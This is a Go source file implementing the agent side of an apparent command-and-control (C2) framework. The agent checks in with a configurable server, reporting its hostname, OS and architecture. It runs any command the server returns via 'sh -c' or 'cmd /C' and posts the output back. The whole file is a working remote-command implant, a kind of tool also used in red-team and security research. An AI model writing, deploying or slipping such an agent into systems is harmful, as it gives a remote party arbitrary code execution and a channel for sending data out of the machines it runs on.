// Package agent implements the C2 agent that checks in with the server,
// executes received commands, and reports results back.
package agent

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/lsanarchist/c2/pkg/protocol"
)

// Agent periodically checks in with the C2 server.
type Agent struct {
	id         string
	hostname   string
	serverURL  string
	interval   time.Duration
	httpClient *http.Client
}

// New creates a new Agent.
func New(id, hostname, serverURL string, interval time.Duration) (*Agent, error) {
	a := &Agent{
		id:         id,
		hostname:   hostname,
		serverURL:  serverURL,
		interval:   interval,
		httpClient: &http.Client{Timeout: 10 * time.Second},
	}

	if err := a.validateConfig(); err != nil {
		return nil, err
	}

	return a, nil
}

func (a *Agent) validateConfig() error {
	if strings.TrimSpace(a.id) == "" {
		return errors.New("agent id is required")
	}
	if a.interval <= 0 {
		return fmt.Errorf("interval must be greater than zero: %s", a.interval)
	}

	parsedURL, err := url.Parse(a.serverURL)
	if err != nil {
		return fmt.Errorf("invalid server URL: %w", err)
	}
	if parsedURL.Scheme != "http" && parsedURL.Scheme != "https" {
		return fmt.Errorf("server URL must use http or https: %q", a.serverURL)
	}
	if parsedURL.Host == "" {
		return fmt.Errorf("server URL host is required: %q", a.serverURL)
	}

	return nil
}

// RunOnce performs a single check-in cycle. It is primarily useful for testing.
func (a *Agent) RunOnce(ctx context.Context) error {
	if err := a.validateConfig(); err != nil {
		return err
	}

	a.checkIn(ctx)
	return nil
}

// Run starts the agent check-in loop and exits when ctx is canceled.
func (a *Agent) Run(ctx context.Context) error {
	if err := a.validateConfig(); err != nil {
		return err
	}

	log.Printf("[agent] starting, id=%s server=%s", a.id, a.serverURL)
	ticker := time.NewTicker(a.interval)
	defer ticker.Stop()

	if err := a.RunOnce(ctx); err != nil {
		return err
	}

	for {
		select {
		case <-ctx.Done():
			log.Printf("[agent] stopping: %v", ctx.Err())
			return nil
		case <-ticker.C:
			a.checkIn(ctx)
		}
	}
}

// checkIn sends a check-in request to the server and handles any returned command.
func (a *Agent) checkIn(ctx context.Context) {
	ci := protocol.CheckIn{
		ID:       a.id,
		Hostname: a.hostname,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
	}

	body, err := json.Marshal(ci)
	if err != nil {
		log.Printf("[agent] marshal error: %v", err)
		return
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, a.serverURL+"/checkin", bytes.NewReader(body))
	if err != nil {
		log.Printf("[agent] build check-in request failed: %v", err)
		return
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := a.httpClient.Do(req)
	if err != nil {
		log.Printf("[agent] check-in failed: %v", err)
		return
	}
	defer resp.Body.Close()

	var ciResp protocol.CheckInResponse
	if err := json.NewDecoder(resp.Body).Decode(&ciResp); err != nil {
		log.Printf("[agent] decode response error: %v", err)
		return
	}

	if ciResp.Command == "" {
		return
	}

	log.Printf("[agent] executing command %s: %s", ciResp.CommandID, ciResp.Command)
	output, execErr := a.execute(ciResp.Command)

	result := protocol.Result{
		AgentID:   a.id,
		CommandID: ciResp.CommandID,
		Output:    output,
	}
	if execErr != nil {
		result.Error = execErr.Error()
	}

	a.sendResult(ctx, result)
}

// execute runs the given shell command and returns its combined output.
func (a *Agent) execute(command string) (string, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// sendResult posts a command result back to the server.
func (a *Agent) sendResult(ctx context.Context, result protocol.Result) {
	body, err := json.Marshal(result)
	if err != nil {
		log.Printf("[agent] marshal result error: %v", err)
		return
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, a.serverURL+"/result", bytes.NewReader(body))
	if err != nil {
		log.Printf("[agent] build result request failed: %v", err)
		return
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := a.httpClient.Do(req)
	if err != nil {
		log.Printf("[agent] send result failed: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusNoContent {
		log.Printf("[agent] unexpected result response: %d", resp.StatusCode)
	}
}
